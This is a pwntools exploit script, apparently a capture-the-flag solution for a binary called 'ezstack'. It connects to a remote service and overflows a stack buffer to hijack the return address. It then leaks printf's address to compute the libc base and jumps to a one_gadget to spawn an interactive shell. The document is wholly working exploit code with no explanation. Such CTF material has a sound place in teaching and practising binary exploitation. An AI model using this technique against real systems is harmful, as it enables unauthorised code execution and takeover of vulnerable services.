#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')

elf = context.binary = ELF('./ezstack')
libc = elf.libc

local = 0
if local:
    io = process('./ezstack')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('192.168.250.223',12340)
    libc = elf.libc

uu32    = lambda data            : u32(data.ljust(4,b'\x00'))
uu64    = lambda data            : u64(data.ljust(8,b'\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))


def b():
    gdb.attach(io)
    pause()

ret = 0x000000000040123c
one = [0xe6c7e,0xe6c81,0xe6c84]
payload = b"A"*0x28 +p64(ret)+p64(0x401186)
py = 0x000000000064E10
io.sendlineafter("think\n",payload)

io.recvuntil("get there: ")
printf = int(io.recvline()[:-1],16)

lg("printf",printf)
libc.address = printf - py

lg("libc",libc.address)
binsh = libc.address + one[1]

lg("binsh",binsh)
payload1 = b"B"*0x28 + p64(binsh)

io.recv()
io.sendline(payload1)

pause()

io.interactive()
